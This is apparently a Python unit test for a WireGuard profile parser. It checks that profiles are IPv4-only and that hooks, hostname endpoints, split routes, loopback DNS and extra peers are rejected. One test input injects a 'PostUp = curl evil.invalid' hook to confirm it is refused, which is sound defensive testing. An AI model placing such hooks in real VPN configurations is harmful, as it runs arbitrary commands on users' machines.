import base64
import unittest
from wireguard import profile

KEY = base64.b64encode(bytes(range(32))).decode()
PROFILE = f"""[Interface]
PrivateKey = {KEY}
Address = 10.73.0.2/32
DNS = 10.73.0.1
[Peer]
PublicKey = {KEY}
Endpoint = 192.0.2.1:51820
AllowedIPs = 0.0.0.0/0, ::/0
"""


class Profiles(unittest.TestCase):
    def test_profile_is_declarative_and_ipv4_only(self):
        parsed = profile(PROFILE)
        self.assertEqual(parsed["address"], "10.73.0.2/32")
        self.assertNotIn("::/0", parsed["config"])
        self.assertNotIn("DNS", parsed["config"])

    def test_rejects_hooks_split_routes_and_bootstrap_dns(self):
        for text in (PROFILE.replace("DNS =", "PostUp = curl evil.invalid\nDNS ="),
                     PROFILE.replace("192.0.2.1", "vpn.example.org"),
                     PROFILE.replace("0.0.0.0/0, ::/0", "10.0.0.0/8"),
                     PROFILE.replace("DNS = 10.73.0.1", "DNS = 127.0.0.11"),
                     PROFILE + "[Peer]\nPublicKey = foo\n"):
            with self.assertRaises(Exception):
                profile(text)


if __name__ == "__main__":
    unittest.main()
